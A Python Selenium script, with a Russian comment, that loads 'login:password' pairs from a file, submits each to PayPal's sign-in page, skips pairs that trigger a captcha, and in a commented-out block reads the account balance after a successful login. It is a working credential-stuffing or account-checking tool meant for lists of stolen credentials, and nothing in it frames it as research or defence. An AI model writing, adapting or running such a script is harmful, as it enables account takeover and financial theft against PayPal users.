from selenium.webdriver import Chrome as Browser, ChromeOptions as Options
import json
import time
import re

LOGIN_URL = "https://www.paypal.com/signin"
PROFILE_URL = "https://www.paypal.com/myaccount/summary"
LOGIN_PASSWORD_FORMAT = re.compile(r"(?P<login>.+):(?P<password>.+)")
with open("login.txt") as f:
    logins = f.read().split()[50:]

br = None
for lp in logins:
    if br:
        br.close()
    br = Browser()
    matches = LOGIN_PASSWORD_FORMAT.match(lp)
    login, password = matches.group('login'), matches.group('password')
    br.get(LOGIN_URL)
    while True:
        try:
            tag = br.find_element_by_id("email")
            if tag.is_displayed():
                break
        except:
            br.get(LOGIN_URL)
        time.sleep(0.1)
    if (tg := br.find_element_by_class_name("captcha-container")).is_displayed():
        continue
    tag.send_keys(login)
    completed = False
    while not completed:  # Может быть случай когда сначало логин и потом кнопку продолжить для пароля
        if (tag := br.find_element_by_id("password")).is_displayed():
            tag.send_keys(password)
            try:
                br.find_element_by_id("btnLogin").click()
                completed = True
            except:
                ...
        elif (tag := br.find_element_by_id("btnNext")).is_displayed():
            try:
                tag.click()
            except:
                ...
        time.sleep(0.1)
    if (tag := br.find_element_by_xpath("//body")).get_attribute("data-view-name") == "authcaptcha":
        continue
    """
    br.get(PROFILE_URL)
    while not (tag := br.find_element_by_class_name("cw_tile-currency")):
        time.sleep(0.1)
    print(tag.text)"""
